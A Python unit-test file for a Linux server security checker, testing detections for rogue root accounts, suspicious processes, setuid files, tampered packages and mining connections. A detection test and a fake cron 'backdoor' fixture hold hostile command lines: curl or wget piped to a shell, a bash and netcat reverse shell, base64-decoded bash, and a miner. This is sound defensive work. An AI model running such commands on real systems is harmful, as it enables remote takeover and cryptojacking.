import os
import stat
import sys
import tempfile
import uuid
import unittest
from ..ScriptCollection.SCLog import SCLog, LogLevel
from ..ScriptCollection.LinuxServerSecurityCheck.SystemAccessBase import SystemAccessBase
from ..ScriptCollection.LinuxServerSecurityCheck.SystemEntities import ProgramResult
from ..ScriptCollection.LinuxServerSecurityCheck.SecurityCheckBase import SecurityCheckBase
from ..ScriptCollection.LinuxServerSecurityCheck.SecurityFinding import SecurityFinding, SecurityFindingSeverity
from ..ScriptCollection.LinuxServerSecurityCheck.SuspiciousCommandPatterns import SuspiciousCommandPatterns
from ..ScriptCollection.LinuxServerSecurityCheck.LinuxServerSecurityChecker import LinuxServerSecurityChecker
from ..ScriptCollection.LinuxServerSecurityCheck.Checks.AccountChecks import NonRootAccountsWithUid0Check, AccountsWithoutPasswordCheck
from ..ScriptCollection.LinuxServerSecurityCheck.Checks.ProcessChecks import ProcessesRunningFromTemporaryFoldersCheck, ProcessesMasqueradingAsKernelThreadsCheck, ProcessesWithDeletedExecutableCheck
from ..ScriptCollection.LinuxServerSecurityCheck.Checks.NetworkChecks import ConnectionsToMiningPoolPortsCheck
from ..ScriptCollection.LinuxServerSecurityCheck.Checks.PersistenceChecks import SuspiciousCommandsInAutostartLocationsCheck
from ..ScriptCollection.LinuxServerSecurityCheck.Checks.FileSystemChecks import SetuidFilesCheck
from ..ScriptCollection.LinuxServerSecurityCheck.Checks.PackageIntegrityChecks import ModifiedPackageFilesCheck


class FakeSystemAccess(SystemAccessBase):
    """In-memory-system for testcases. Folders are derived from the paths of the files and symlinks."""

    def __init__(self):
        self.files: dict[str, bytes] = {}
        self.modes: dict[str, int] = {}
        self.symlinks: dict[str, str] = {}
        self.programs: dict[str, ProgramResult] = {}
        self.is_root: bool = True
        self.add_file("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
        self.add_file("/proc/mounts", "/dev/sda1 / ext4 rw 0 0\nproc /proc proc rw 0 0\n")

    def add_file(self, path: str, content: str | bytes, mode: int = 0o644) -> None:
        self.files[path] = content.encode("utf-8") if isinstance(content, str) else content
        self.modes[path] = stat.S_IFREG | mode

    def add_symlink(self, path: str, target: str) -> None:
        self.symlinks[path] = target

    def add_process(self, pid: int, name: str, executable: str | None, commandline: list[str]) -> None:
        self.add_file(f"/proc/{pid}/status", f"Name:\t{name}\nUid:\t0\t0\t0\t0\n")
        self.add_file(f"/proc/{pid}/cmdline", b"\0".join(argument.encode("utf-8") for argument in commandline))
        if executable is not None:
            self.add_symlink(f"/proc/{pid}/exe", executable)

    def __all_paths(self) -> list[str]:
        return list(self.files.keys()) + list(self.symlinks.keys())

    def __is_derived_folder(self, path: str) -> bool:
        prefix = path.rstrip("/") + "/"
        return any(existing_path.startswith(prefix) for existing_path in self.__all_paths())

    def current_user_is_root(self) -> bool:
        return self.is_root

    def read_bytes(self, path: str, maximal_amount_of_bytes: int) -> bytes | None:
        if path not in self.files:
            return None
        return self.files[path][:maximal_amount_of_bytes]

    def list_folder(self, path: str) -> list[str] | None:
        if not self.__is_derived_folder(path):
            return None
        prefix = path.rstrip("/") + "/"
        return sorted({existing_path[len(prefix):].split("/")[0] for existing_path in self.__all_paths() if existing_path.startswith(prefix)})

    def get_lstat(self, path: str) -> os.stat_result | None:
        if path in self.symlinks:
            mode = stat.S_IFLNK | 0o777
            size = 0
        elif path in self.files:
            mode = self.modes[path]
            size = len(self.files[path])
        elif path == "/" or self.__is_derived_folder(path):
            mode = stat.S_IFDIR | 0o755
            size = 0
        else:
            return None
        return os.stat_result((mode, 0, 0, 1, 0, 0, size, 0, 0, 0))

    def path_exists(self, path: str) -> bool:
        return self.get_lstat(path) is not None

    def read_link(self, path: str) -> str | None:
        return self.symlinks.get(path)

    def program_is_available(self, program: str) -> bool:
        return program in self.programs

    def run_program(self, program: str, arguments: list[str]) -> ProgramResult:
        return self.programs[program]

    def get_file_attribute_flags(self, path: str) -> int | None:
        return None

    def get_current_time(self) -> float:
        return 0.0


class FixedFindingsCheck(SecurityCheckBase):

    def __init__(self, severities: list[SecurityFindingSeverity]):
        self.__severities = severities

    def run(self, system: SystemAccessBase) -> list[SecurityFinding]:
        return [self.create_finding(severity, "test-finding") for severity in self.__severities]


class FailingCheck(SecurityCheckBase):

    def run(self, system: SystemAccessBase) -> list[SecurityFinding]:
        raise ValueError("test-error")


class LinuxServerSecurityCheckTests(unittest.TestCase):

    def __get_severities(self, findings: list[SecurityFinding]) -> list[SecurityFindingSeverity]:
        return [finding.severity for finding in findings]

    def test_exit_code_is_amount_of_high_findings(self) -> None:
        # arrange
        checks: list[SecurityCheckBase] = [FixedFindingsCheck([SecurityFindingSeverity.High, SecurityFindingSeverity.Mid, SecurityFindingSeverity.High, SecurityFindingSeverity.Low])]
        checker = LinuxServerSecurityChecker(SCLog(None, LogLevel.Quiet), FakeSystemAccess(), checks)

        # act
        exit_code = checker.run()

        # assert
        assert exit_code == 2

    def test_exit_code_is_capped(self) -> None:
        # arrange
        checks: list[SecurityCheckBase] = [FixedFindingsCheck([SecurityFindingSeverity.High] * 300)]
        checker = LinuxServerSecurityChecker(SCLog(None, LogLevel.Quiet), FakeSystemAccess(), checks)

        # act
        exit_code = checker.run()

        # assert
        assert exit_code == LinuxServerSecurityChecker.maximal_exit_code_for_findings

    def test_failing_check_results_in_error_exit_code_and_other_checks_are_executed(self) -> None:
        # arrange
        log_file = os.path.join(tempfile.gettempdir(), str(uuid.uuid4()) + ".log")
        checks: list[SecurityCheckBase] = [FailingCheck(), FixedFindingsCheck([SecurityFindingSeverity.High])]
        log = SCLog(log_file, LogLevel.Information, False)
        checker = LinuxServerSecurityChecker(log, FakeSystemAccess(), checks)
        try:

            # act
            exit_code = checker.run()

            # assert
            assert exit_code == LinuxServerSecurityChecker.exit_code_for_application_error
            with open(log_file, encoding="utf-8") as file:
                assert "[High] [FixedFindings] test-finding" in file.read()
        finally:
            if os.path.isfile(log_file):
                os.remove(log_file)

    def test_non_root_user_is_rejected(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.is_root = False
        checker = LinuxServerSecurityChecker(SCLog(None, LogLevel.Quiet), system, [])

        # act and assert
        with self.assertRaises(PermissionError):
            checker.run()

    def test_finding_line_format(self) -> None:
        # arrange
        finding = SecurityFinding("SomeCheck", SecurityFindingSeverity.Mid, "first line\nsecond line")

        # act
        line = finding.to_line()

        # assert
        assert line == "[Mid] [SomeCheck] first line second line"

    def test_default_checks_have_unique_names(self) -> None:
        # arrange
        checks = LinuxServerSecurityChecker.get_default_checks()

        # act
        names = [check.get_name() for check in checks]

        # assert
        assert len(names) == len(set(names))

    def test_accounts_with_uid_0_and_without_password(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.add_file("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n")
        system.add_file("/etc/shadow", "root:$6$abc:19000::::::\ntoor::19000::::::\nalice:!:19000::::::\n")

        # act
        uid_0_findings = NonRootAccountsWithUid0Check().run(system)
        password_findings = AccountsWithoutPasswordCheck().run(system)

        # assert
        assert self.__get_severities(uid_0_findings) == [SecurityFindingSeverity.High]
        assert "\"toor\"" in uid_0_findings[0].message
        assert self.__get_severities(password_findings) == [SecurityFindingSeverity.High]
        assert "\"toor\"" in password_findings[0].message

    def test_processes_from_temporary_folders_and_masquerading_processes(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.add_process(1, "systemd", "/usr/lib/systemd/systemd", ["/sbin/init"])
        system.add_process(2, "kthreadd", None, [])
        system.add_process(3, "kworker", "/tmp/.x/kworker", ["[kworker/0:1]", "-c", "config"])
        system.add_process(4, "nginx", "/usr/sbin/nginx", ["nginx: worker process"])

        # act
        temporary_folder_findings = ProcessesRunningFromTemporaryFoldersCheck().run(system)
        masquerading_findings = ProcessesMasqueradingAsKernelThreadsCheck().run(system)

        # assert
        assert len(temporary_folder_findings) == 1 and "pid 3 " in temporary_folder_findings[0].message
        assert len(masquerading_findings) == 1 and "pid 3 " in masquerading_findings[0].message

    def test_deleted_executables(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.add_process(10, "updated", "/usr/sbin/updated (deleted)", ["/usr/sbin/updated"])
        system.add_file("/proc/10/root/usr/sbin/updated", "new version")
        system.add_process(11, "vanished", "/usr/local/bin/vanished (deleted)", ["vanished"])

        # act
        findings = ProcessesWithDeletedExecutableCheck().run(system)

        # assert
        assert self.__get_severities(findings) == [SecurityFindingSeverity.Low, SecurityFindingSeverity.Mid]

    def test_suspicious_command_patterns(self) -> None:
        # arrange
        suspicious_lines = [
            "* * * * * root curl -fsSL http://example.invalid/x.sh | sh",
            "wget -q -O- http://example.invalid/x | /bin/bash",
            "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
            "echo aGVsbG8= | base64 -d | bash",
            "nc 192.0.2.1 4444 -e /bin/sh",
            "/tmp/.hidden/miner --url stratum+tcp://pool.example.invalid:3333",
        ]
        benign_lines = [
            "curl -fsSL https://example.invalid/key.gpg -o /usr/share/keyrings/key.gpg",
            "ExecStartPre=/bin/mkdir -p /tmp/.X11-unix",
            "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
            "if [ -n \"$BASH_VERSION\" ]; then . \"$HOME/.bashrc\"; fi",
        ]

        # act and assert
        for line in suspicious_lines:
            assert len(SuspiciousCommandPatterns.find_matches(line)) > 0, line
        for line in benign_lines:
            assert len(SuspiciousCommandPatterns.find_matches(line)) == 0, line

    def test_suspicious_commands_in_autostart_locations(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.add_file("/etc/cron.d/backdoor", "# curl http://example.invalid | sh\n*/5 * * * * root curl -s http://example.invalid/x | sh\n")
        system.add_file("/root/.bashrc", "alias ll='ls -l'\n")

        # act
        findings = SuspiciousCommandsInAutostartLocationsCheck().run(system)

        # assert
        assert len(findings) == 1
        assert findings[0].severity == SecurityFindingSeverity.High
        assert "\"/etc/cron.d/backdoor\" line 2" in findings[0].message

    def test_setuid_files(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.add_file("/var/lib/dpkg/info/passwd.list", "/usr/bin/passwd\n")
        system.add_file("/usr/bin/passwd", "elf", 0o4755)
        system.add_file("/usr/bin/evil", "elf", 0o4755)
        system.add_file("/tmp/.x/sh", "elf", 0o4755)
        system.add_file("/srv/tool", "elf", 0o2755)
        system.add_file("/usr/bin/ls", "elf", 0o755)
        system.add_file("/proc/1/suid", "elf", 0o4755)

        # act
        findings = SetuidFilesCheck().run(system)

        # assert
        messages = {finding.message.split("\"")[1]: finding.severity for finding in findings}
        assert messages == {"/usr/bin/evil": SecurityFindingSeverity.High, "/tmp/.x/sh": SecurityFindingSeverity.High, "/srv/tool": SecurityFindingSeverity.Mid}

    def test_modified_package_files(self) -> None:
        # arrange
        system = FakeSystemAccess()
        system.programs["dpkg"] = ProgramResult(1, "??5??????   /usr/bin/ps\n??5?????? c /etc/ssh/sshd_config\n??5??????   /usr/lib/x86_64-linux-gnu/libprocps.so.8\n??5??????   /usr/share/doc/x/README\n", "")

        # act
        findings = ModifiedPackageFilesCheck().run(system)

        # assert
        assert self.__get_severities(findings) == [SecurityFindingSeverity.High, SecurityFindingSeverity.Mid]

    def test_decode_socket_address(self) -> None:
        # act
        address, port = SystemAccessBase.decode_socket_address("0100007F:0D05" if sys.byteorder == "little" else "7F000001:0D05")

        # assert
        assert address == "127.0.0.1"
        assert port == 3333

    def test_connections_to_mining_pool_ports_ignore_incoming_connections(self) -> None:
        # arrange
        system = FakeSystemAccess()
        listening = "  0: 00000000:0D05 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 100 1 0 100 0 0 10 0"
        incoming = "  1: 0100007F:0D05 0100007F:B1F8 01 00000000:00000000 00:00000000 00000000     0        0 101 1 0 100 0 0 10 0"
        outgoing = "  2: 0100007F:B1F9 02000080:0D05 01 00000000:00000000 00:00000000 00000000     0        0 102 1 0 100 0 0 10 0"
        system.add_file("/proc/net/tcp", "header\n" + "\n".join([listening, incoming, outgoing]) + "\n")

        # act
        findings = ConnectionsToMiningPoolPortsCheck().run(system)

        # assert
        assert len(findings) == 1
        assert ":45561 -> " in findings[0].message
